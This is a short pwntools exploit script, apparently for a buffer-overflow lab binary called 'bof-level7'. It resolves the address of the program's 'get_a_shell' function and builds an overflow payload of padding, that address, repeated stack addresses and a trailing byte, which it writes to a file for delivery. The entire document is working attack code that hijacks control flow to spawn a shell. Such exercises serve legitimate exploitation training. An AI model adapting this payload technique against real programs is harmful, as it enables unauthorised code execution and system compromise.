#!/usr/bin/env python
from pwn import	*
# LOL=KJADGJKHGSDZJHFGSJHDGFHJGSD
# stack offset to overwrite rip
stack_offset = 0x88
stack = p32(0xffffd460)
p = process("./bof-level7")

# print output
print(p.recv(0x200))

# load the program as an ELF object
e = ELF("./bof-level7")

# get the address of get_a_shell
shell_address = e.symbols['get_a_shell']

print hex(shell_address)

buffer = 'A'*4 + p32(shell_address) + stack*128 + "\x60"

with open('pattern.txt', 'w') as f:
    f.write(buffer)
